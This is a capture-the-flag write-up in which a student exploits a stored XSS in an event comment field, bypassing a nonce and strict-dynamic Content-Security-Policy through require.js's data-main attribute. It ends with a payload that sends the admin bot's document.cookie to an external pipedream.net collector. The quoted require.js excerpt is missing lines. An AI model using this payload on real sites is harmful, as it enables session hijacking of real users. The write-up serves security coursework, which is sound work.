In order to get the flag I had to steal the admin coockies from his session. 
Obviously the admin is emulated from a bot, to whom I had to send a malicious link.
To create the malicious link I have to use some vulnerability in the website. 

In this case I searched for a vulnerability by injecting a simple script (<script>alert(1)</script>)
in every possible form field. By looking which one was doing somenthing strange I was able to 
undestand a vulnerability. 

In this case in the section "comment" of an event the html sanitazier doesn't work properly.
Unfortunaly the script doesn't run because of the Content-Security-Policy: it doesn't run code outside
this domanins:

default-src 'self'; 
script-src 'strict-dynamic' 'nonce-bBTAWebbQE';
style-src 'self' https://stackpath.bootstrapcdn.com/bootstrap/;
font-src 'self' https://stackpath.bootstrapcdn.com/bootstrap/;
object-src 'none'

as you can see a nonce + strict-dynamic strategy have been adopted, so what I have done in the
csp challenge will not work in this one. 

By looking in the slides of the professor I found that more or less all the websites 
load a require.js file, in which a lot of function are loaded.
From the website a looked the require.js file and I found the following code. 

/**
     * Does the request to load a module for the browser case.
     * Make this a separate function to allow other environments
     * to override it.
     *
     * @param {Object} context the require context to find state.
     * @param {String} moduleName the name of the module.
     * @param {Object} url the URL to the module.
     */
    req.load = function (context, moduleName, url) {
        var config = (context && context.config) || {},
            node;
        if (isBrowser) {
            //In the browser so use a script tag
            node = req.createNode(config, moduleName, url);

            node.setAttribute('data-requirecontext', context.contextName);
            node.setAttribute('data-requiremodule', moduleName);

            //Set up load listener. Test attachEvent first because IE9 has
            //a subtle issue in its addEventListener and script onload firings
            //that do not match the behavior of all other browsers with
            //addEventListener support, which fire the onload event for a
            //script right after the script execution. See:
            //https://connect.microsoft.com/IE/feedback/details/648057/script-onload-event-is-not-fired-immediately-after-script-execution

                    !(node.attachEvent.toString && node.attachEvent.toString().indexOf('[native code') < 0) &&
                    !isOpera) {
                //Probably IE. IE (at least 6-8) do not fire
                //script onload right after executing the script, so
                //we cannot tie the anonymous define call to a name.
                //However, IE reports the script as being in 'interactive'
                //readyState at the time of the define call.

                node.attachEvent('onreadystatechange', context.onScriptLoad);
                //It would be great to add an error handler here to catch
                //404s in IE9+. However, onreadystatechange will fire before
                //the error handler, so that does not help. If addEventListener
                //is used, then IE will fire error before load, but we cannot
                //use that pathway given the connect.microsoft.com issue
                //mentioned above about not doing the 'script execute,
                //then fire the script load event listener before execute
                //next script' that other browsers do.
                //Best hope: IE10 fixes the issues,
                //and then destroys all installs of IE 6-9.
                //node.attachEvent('onerror', context.onScriptError);
            } else {
                node.addEventListener('load', context.onScriptLoad, false);

            return node;
        } else if (isWebWorker) {
            try {
                //In a web worker, use importScripts. This is not a very
                //efficient use of importScripts, importScripts will block until
                //its script is downloaded and evaluated. However, if web workers
                //are in play, the expectation is that a build has been done so
                //that only one script needs to be loaded anyway. This may need
                //to be reevaluated if other use cases become common.

                // Post a task to the event loop to work around a bug in WebKit
                // where the worker gets garbage-collected after calling
                // importScripts(): https://webkit.org/b/153317
                setTimeout(function() {}, 0);
                importScripts(url);

                //Account for anonymous modules
                context.completeLoad(moduleName);
            } catch (e) {
                context.onError(makeError('importscripts',
                                'importScripts failed for ' +
                                    moduleName + ' at ' + url,
                                e,
                                [moduleName]));
            }
        }
    };


so this code is loading an element. I can exploit it by using

<script data-main='data:1,alert(1)'></script>

Now, I just hav to change alert(1) with some code that let me recive the admin's coockie

<script data-main='data:1,document.location="https://enwmrr6eb6wa.x.pipedream.net/?"+document.cookie' ></script>

where the website is the one used also for the csp challenge
